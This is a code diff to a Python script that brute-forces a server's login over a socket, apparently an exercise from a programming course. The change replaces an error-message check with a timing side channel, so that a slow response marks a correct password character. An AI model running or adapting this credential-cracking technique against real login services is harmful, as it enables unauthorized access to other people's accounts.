@@ -1,3 +1,4 @@
+from time import time
 import socket
 import json
 from cmdline import get_cmdline_args
@@ -22,9 +23,13 @@ def check_creds(socket_conn: socket, creds_data: list[str], creds_type: str) -> 
             elif creds_type == "password":
                 pwd_chars.append(val_combo)
                 cracked_creds[creds_type] = "".join(pwd_chars)
+                start = time()
                 response = socket_operation(soc_con=socket_conn,
                                             msg=json.dumps(cracked_creds))
-                if json.loads(response)["result"] == "Exception happened during login":
+                end = time()
+                time_taken_for_response = end - start
+
+                if 1e-1 < time_taken_for_response < 1:
                     return
                 elif json.loads(response)["result"] == "Connection success!":
                     return "success"
@@ -59,5 +64,6 @@ if __name__ == "__main__":
         "password": ""
     }
     main()
+    cracked_creds["password"] = ''.join(pwd_chars)
     ans = json.dumps(cracked_creds)
     print(ans)
